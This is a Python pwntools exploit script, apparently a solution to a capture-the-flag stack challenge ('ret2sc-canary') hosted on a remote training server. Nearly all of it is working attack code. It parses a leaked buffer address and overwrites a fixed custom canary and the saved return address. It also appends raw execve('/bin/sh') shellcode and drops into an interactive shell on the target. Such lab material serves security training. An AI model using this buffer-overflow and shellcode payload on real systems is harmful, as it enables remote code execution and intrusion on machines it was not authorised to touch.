#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=cytech.tcdn.casa' '--port=4103' 1-stack-03-ret2sc-canary
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '1-stack-03-ret2sc-canary')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'cytech.tcdn.casa'
port = int(args.PORT or 4103)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      No RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

# Récupérer l'adresse divulguée
io.recvuntil(b"at ")
raw = io.recvuntil(b"\n\n", drop=True)
m = re.search(rb"0x[0-9a-fA-F]+", raw)
leak = int(m.group(0), 16)

# Valeurs statiques
canary_offset = 15
canary_size = 8
saved_rip_offset = 39

# Addresses absolues
buffer_addr = leak
saved_rip_addr = buffer_addr + saved_rip_offset
space_after_canary = saved_rip_offset - (canary_offset + canary_size)
shellcode_addr = saved_rip_addr + 8

# Payload
pad_before_canary = b"\x90" * canary_offset
canary = p64(0xCAFEcafeCAFEcafe)[:canary_size]
pad_after_canary = b"\x90" * space_after_canary
saved_rip_override = p64(shellcode_addr)
shellcode = b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\x6a\x00\x58\x48\x0f\xaf\xf0\xb0\x3b\x0f\x05"

payload = pad_before_canary + canary + pad_after_canary + saved_rip_override + shellcode

io.sendline(payload)
io.interactive()
